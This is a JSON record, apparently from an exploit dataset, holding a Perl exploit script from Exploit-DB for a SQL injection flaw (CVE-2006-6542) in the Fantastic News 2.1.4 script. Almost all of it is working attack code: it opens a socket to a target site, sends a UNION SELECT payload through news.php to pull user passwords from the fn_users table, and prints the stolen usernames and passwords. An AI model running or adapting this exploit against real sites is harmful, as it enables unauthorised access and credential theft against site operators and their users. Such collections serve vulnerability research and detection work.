{
  "id": "2906",
  "title": "Fantastic News 2.1.4 - &#039;news.php&#039; SQL Injection",
  "cve": "CVE-2006-6542",
  "vuln_type": "sqli",
  "code": "#!perl\r\n#Download:http://fscripts.com/download.php?file=1\r\nuse IO::Socket;\r\n#dc3.dl.am\r\nif (@ARGV<3) {\r\n&header;\r\n} else {\r\n&get();\r\n}\r\nsub get() {\r\n$host=$ARGV[0];\r\n$path=$ARGV[1];\r\n  $id=$ARGV[2];\r\n$socket=IO::Socket::INET->new(Proto=>\"tcp\",PeerAddr=>\"$host\",PeerPort=>80)\r\nor die (\"[-]Error\\n\");\r\nprint \"[~]Connecting!\\n\";\r\nprint \"[~]Getting Data!\\n\";\r\nprint $socket \"GET\r\n\".$path.\"/news.php?action=profile&id=-1%20UNION%20SELECT%201,2,3,4,5,password,1,2,3,4,5,6,7,8,9%20FROM%20fn_users%20WHERE%20user_id=\".$id.\"/*\r\nHTTP/1.1\\n\";\r\nprint $socket \"Host: $host\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\n\r\nwhile ($ans=<$socket>) {\r\n$ans=~ m/<td>(.*?)<\\/td>/ && print\r\n\"--------------------------------------------\\n[+]UserName:\r\n$1\\n[+]PassWord:\";\r\nif ($1) {\r\n$success=1; } else { $success=0;};\r\n}\r\nif ($success==\"1\") {\r\nprint \"\\n[+]Successed!\";\r\n } else {\r\nprint \"[-]Error\";\r\n   }\r\n }\r\nsub header() {\r\nprint \"\\n\";\r\nprint \"#######################################\\n\";\r\nprint \"#                                     #\\n\";\r\nprint \"#            #  #####   #####         #\\n\";\r\nprint \"#            #  #           #         #\\n\";\r\nprint \"#         ####  #         ###         #\\n\";\r\nprint \"#         #  #  #           #         #\\n\";\r\nprint \"#         ####  #####   #####         #\\n\";\r\nprint \"#                                     #\\n\";\r\nprint \"#      fscripts.pl host /path/ 1      #\\n\";\r\nprint \"#                                     #\\n\";\r\nprint \"#######################################\\n\";\r\nprint \"\\n\";\r\nexit;\r\n}\r\n#dc3.dl.am\r\n#---------------------\r\n#bY dC\u00b3 - Crew ...\r\n\r\n# milw0rm.com [2006-12-09]",
  "url": "https://www.exploit-db.com/exploits/2906"
}